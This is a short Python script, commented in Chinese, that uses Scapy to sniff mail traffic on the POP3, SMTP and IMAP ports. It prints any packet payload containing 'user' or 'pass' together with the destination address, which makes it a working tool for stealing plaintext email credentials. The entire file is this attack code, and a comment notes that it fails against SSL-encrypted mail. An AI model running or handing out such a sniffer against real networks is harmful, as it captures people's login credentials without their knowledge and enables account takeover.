# -*- coding: utf-8 -*-
# 基于Scapy email 身份窃取
# 目前大部分邮箱都有ssl加密，所以无法通过user和pass两个关键字获取到帐号密码
from scapy.all import sniff, TCP, IP


def packet_callback(packet):
    ''' 回调接受嗅探到的数据包 '''
    print("packet callback 被调用.")
    if packet[TCP].payload:
        # 接收到的数据包
        mypacket = str(packet[TCP].payload)
        print(mypacket)
        if "user" in mypacket.lower() or "pass" in mypacket.lower():
            print(f"[*] 目标网址: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")


def main():
    ''' 主函数 '''
    sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",
          prn=packet_callback, store=0)


if __name__ == '__main__':
    main()
